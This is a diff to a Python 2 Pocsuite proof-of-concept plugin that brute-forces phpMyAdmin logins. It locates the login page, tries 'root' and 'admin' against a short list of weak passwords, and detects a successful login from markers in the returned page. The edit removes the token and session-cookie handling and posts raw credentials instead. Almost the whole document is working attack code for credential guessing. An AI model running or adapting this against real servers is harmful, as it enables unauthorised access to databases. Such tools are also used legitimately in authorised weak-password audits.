@@ -1,11 +1,9 @@
 #!/usr/bin/env python
 # coding: utf-8
-import re
-import urllib
 from pocsuite.api.request import req
 from pocsuite.api.poc import register
 from pocsuite.api.poc import Output, POCBase
-# from pocsuite.api.utils import getWeakPassword
+from pocsuite.api.utils import getWeakPassword
 
 
 class TestPOC(POCBase):
@@ -29,66 +27,37 @@ class TestPOC(POCBase):
     def _attack(self):
         return self._verify()
 
-    def _netreq(self, target_url, username, password):
+    def _verify(self):
         result = {}
         flag_list = ['src="navigation.php', 'frameborder="0" id="frame_content"', 'id="li_server_type">',
                      'class="disableAjax" title=']
-        
-        for _ in range(10):
-            res = req.get(url = target_url)
-            set_session = re.findall(r"name=\"set_session\" value=\"(.*?)\" \/", res.text)[0]
-            token = re.findall(r"name=\"token\" value=\"(.*?)\" \/", res.text)[0]
-            cookie = ''
-            for x,y in res.cookies.get_dict().items():
-                cookie = cookie + "{}={};".format(x,y)
-            header = {
-                "Content-Type":"application/x-www-form-urlencoded",
-                "Cookie": cookie
-            }
-            payload = {
-                "set_session": set_session,
-                "pma_username": username,
-                "pma_password": password,
-                "server": "1",
-                "target": "index.php",
-                "token": token
-            }
-            payload = urllib.urlencode(payload)
-            response = req.post(url = target_url, data=payload, headers=header)
-            for flag in flag_list:
-                if flag in response.content:
-                    result['VerifyInfo'] = {}
-                    result['VerifyInfo']['URL'] = target_url
-                    result['VerifyInfo']['Payload'] = payload
-                    return result
-        return result
-
-    def _verify(self):
-        result = {}
         user_list = ['root', 'admin']
         password_list = ['root', '123456', '12345678', 'password', 'passwd', '123']
-        target_url = ''
         try:
             response = req.get(self.url)
-            if 'phpMyAdmin' in response.content and '用户名' in response.content:
+            if 'name=\"phpMyAdmin\"' in response.content:
                 target_url = str(self.url) + "/index.php"
             else:
                 response = req.get(self.url + '/phpmyadmin/index.php')
                 if 'input_password' in response.content and 'name="token"' in response.content:
                     target_url = self.url + "/phpmyadmin/index.php"
         except Exception as e:
-            print e
+            pass
 
         for user in user_list:
             for password in password_list:
+                payload_data = "pma_username=" + str(user.strip()) + "&pma_password=" + str(password.strip()) + "" \
+                               "&server=1&target=index.php&lang=zh_CN&collation_connection=utf8_general_ci"
                 try:
-                    result = self._netreq(target_url, user, password)
-                    if result:
-                        print "result=>",result
-                        return self.parse_output(result)
+                    respond = req.post(target_url, data=payload_data)
+                    for flag in flag_list:
+                        if flag in respond.content:
+                            result['VerifyInfo'] = {}
+                            result['VerifyInfo']['URL'] = target_url
+                            result['VerifyInfo']['Payload'] = payload_data
                 except Exception as e:
-                    print e
-
+                    # print(e)
+                    pass
         return self.parse_output(result)
 
     def parse_output(self, result):
@@ -99,5 +68,6 @@ class TestPOC(POCBase):
         else:
             output.fail('Internet nothing returned')
         return output
+
 
 register(TestPOC)
